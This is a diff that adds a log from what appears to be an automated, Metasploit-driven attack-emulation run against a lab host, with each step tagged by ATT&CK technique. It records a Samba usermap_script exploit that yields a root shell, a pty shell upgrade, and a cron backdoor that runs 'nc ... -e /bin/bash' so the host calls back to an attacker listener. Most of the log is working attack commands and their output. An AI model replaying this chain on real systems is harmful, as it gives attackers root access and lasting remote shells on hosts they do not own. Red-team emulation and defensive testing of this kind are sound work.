@@ -1,0 +1,48 @@
+2026-04-09 12:00:23 INFO - Delay before commands: 0 seconds
+2026-04-09 12:00:23 INFO - Executing commands from 'solutions/solution_entry_samba.yml'
+2026-04-09 12:00:23 INFO - Delay before commands: 0 seconds
+2026-04-09 12:00:23 WARNING - Debug: 'Attempting Samba usermap_script exploit against 192.168.56.101 ports 139/445...'
+2026-04-09 12:00:23 INFO - Executing Msf-Module: 'exploit/multi/samba/usermap_script'
+2026-04-09 12:00:23 INFO - Metadata: {"tactic": "TA0001", "technique": "T1190", "technique_name": "Exploit Public-Facing Application"}
+2026-04-09 12:00:54 INFO - Executing Msf-Session-Command: 'id'
+2026-04-09 12:00:54 INFO - Executing a msf-command
+2026-04-09 12:00:55 WARNING - Setting Variable: 'SESSION_NAME'
+2026-04-09 12:00:55 WARNING - Debug: 'Samba shell established. Running as: uid=0(root) gid=0(root)
+'
+2026-04-09 12:00:55 WARNING - Setting Variable: 'UPGRADESESSION'
+2026-04-09 12:00:55 INFO - Executing commands from 'solutions/solution_upgrade_shell.yml'
+2026-04-09 12:00:55 INFO - Delay before commands: 0 seconds
+2026-04-09 12:00:55 INFO - Executing Msf-Session-Command: 'python -c "import pty;pty.spawn(\"/bin/bash\")";'
+2026-04-09 12:00:55 INFO - Executing a msf-command
+2026-04-09 12:00:56 INFO - Executing Msf-Session-Command: 'export SHELL=bash'
+2026-04-09 12:00:56 INFO - Executing a msf-command
+2026-04-09 12:00:57 INFO - Executing Msf-Session-Command: 'export TERM=xterm256-color'
+2026-04-09 12:00:57 INFO - Executing a msf-command
+2026-04-09 12:00:58 INFO - Executing Msf-Session-Command: 'stty rows 38 columns 116'
+2026-04-09 12:00:58 INFO - Executing a msf-command
+2026-04-09 12:00:59 INFO - Executing Msf-Session-Command: 'export PS1=" >"'
+2026-04-09 12:00:59 INFO - Executing a msf-command
+2026-04-09 12:01:00 INFO - Sleeping 2 seconds
+2026-04-09 12:01:02 INFO - Executing commands from 'solutions/solution_persist_cron_vim.yml'
+2026-04-09 12:01:02 INFO - Delay before commands: 0 seconds
+2026-04-09 12:01:02 INFO - Run in background: msf-module(exploit/multi/handler)
+2026-04-09 12:01:02 INFO - Metadata: {"tactic": "TA0011", "technique": "T1095", "technique_name": "Non-Application Layer Protocol"}
+2026-04-09 12:01:03 INFO - Executing Msf-Session-Command: 'vim /etc/cron.d/backdoor7'
+2026-04-09 12:01:03 INFO - Executing a msf-command
+2026-04-09 12:01:05 INFO - Sleeping 5 seconds
+2026-04-09 12:01:10 INFO - Executing Msf-Session-Command: ':inoremap jj <ESC>'
+2026-04-09 12:01:10 INFO - Executing a msf-command
+2026-04-09 12:01:11 INFO - Sleeping 2 seconds
+2026-04-09 12:01:13 INFO - Executing Msf-Session-Command: '1 * * * * root nc 192.168.56.1 4445 -e /bin/bash'
+2026-04-09 12:01:13 INFO - Metadata: {"tactic": "TA0003", "technique": "T1053.003", "technique_name": "Scheduled Task/Job: Cron"}
+2026-04-09 12:01:13 INFO - Executing a msf-command
+2026-04-09 12:01:14 INFO - Executing Msf-Session-Command: 'jj'
+2026-04-09 12:01:14 INFO - Executing a msf-command
+2026-04-09 12:01:15 INFO - Executing Msf-Session-Command: ':wq!
+'
+2026-04-09 12:01:15 INFO - Metadata: {"tactic": "TA0003", "technique": "T1053.003", "technique_name": "Scheduled Task/Job: Cron"}
+2026-04-09 12:01:15 INFO - Executing a msf-command
+2026-04-09 12:01:17 WARNING - Debug: 'Cron file written via vim. Listener running - waiting for callback'
+2026-04-09 12:01:17 INFO - Executing Msf-Session-Command: 'id'
+2026-04-09 12:03:57 WARNING - Program stopped manually
+2026-04-09 12:03:57 INFO - Msf session 54 stopped successfully.
